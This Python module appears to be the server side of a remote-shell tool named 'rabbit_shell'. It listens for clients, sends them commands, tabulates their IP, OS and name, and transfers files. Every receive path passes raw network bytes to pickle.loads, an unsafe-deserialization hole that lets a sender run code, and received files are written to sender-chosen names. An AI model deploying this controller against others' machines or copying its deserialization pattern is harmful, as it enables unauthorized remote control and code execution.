import socket
import pickle
import prettytable
import sys

from rabbit_shell.data import data
from rabbit_shell.data.data import BUFFER_SIZE


class server_side:



    def create_socket(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, int(port)))
        self.server.listen()
        return self.server
    def response(self, client):
        res = client.recv(data.BUFFER_SIZE)
        return pickle.loads(res)


    def encode_data(self, data, formate: str=data.CODE_FORMATE):

        return data.encode(formate)


    def checkon_clients(self, clients, addresses, dates):
        table = prettytable.PrettyTable()
        table.field_names = [data.USENUM, data.IP_ADDRESS, data.STATUS, "JOINED"]


        for client in clients:
            index = clients.index(client)
            address = addresses[int(index)]
            date = dates[int(index)]
            try:
                ping_data = self.encode_data(data.CLIENT_PING_DATA)
                client.send(ping_data)
                status = data.ONLINE_STATUS
            except:
                status = data.OFFLINE_STATUS

            table.add_row([index, address, status, date])

        return table




    def sendcommand(self, client, data: str):

        encoded_data = self.encode_data(data)

        return client.send(encoded_data)

    def recvpath(self, client):

        self.sendcommand(client, data.PATHPING)
        path, res = self.response(client)
        return path

    def auther_response(self, auther):

        res = auther.recv(data.BUFFER_SIZE)
        pickle.loads(res)
        return pickle.loads(res)


    def auther_send(self, auther, path, dt):

        dt = [path, dt]

        dt = pickle.dumps(dt)

        return auther.send(dt)

    def auther_clients_list(self, ls):
        table = prettytable.PrettyTable()
        table.field_names = [data.USENUM, data.IP_ADDRESS, "LOCAL IP", "os", "name", data.STATUS]
        index = 0
        for lis in ls:
            client, address, payload = tuple(lis)

            try:
                ping_data = self.encode_data(data.CLIENT_PING_DATA)
                client.send(ping_data)
                status = data.ONLINE_STATUS
            except:
                status = data.OFFLINE_STATUS

            table.add_row([index, address, payload["ip"], payload["os"], payload["name"], status])
            index += 1
        return table


class filetrans:
    global serverside
    serverside = server_side()

    def create_filetrans_socket(self, host: str, port: int):

        return serverside.create_socket(host, int(port))


    def sendbytes(self, client, filename, byte):

        ls = [filename, byte]
        dt = pickle.dumps(ls)
        client.send(dt)
        return


    def sendfile(self, client, filename):
        file = open(filename, "rb")
        bytes = file.read(BUFFER_SIZE)
        ls = [filename, bytes]
        data = pickle.dumps(ls)
        client.send(data)
        print("file sent.")
        return file.close()

    def recv_bytes(self, client):
        res = client.recv(BUFFER_SIZE)
        filename, byte = pickle.loads(res)

        return filename, byte





    def recvfile(self, client):
        while True:
            try:
                res = client.recv(BUFFER_SIZE)
                filename, data = pickle.loads(res)

                with open(filename, "wb") as file:

                    file.write(data)
                    file.close()
            except Exception:
                continue








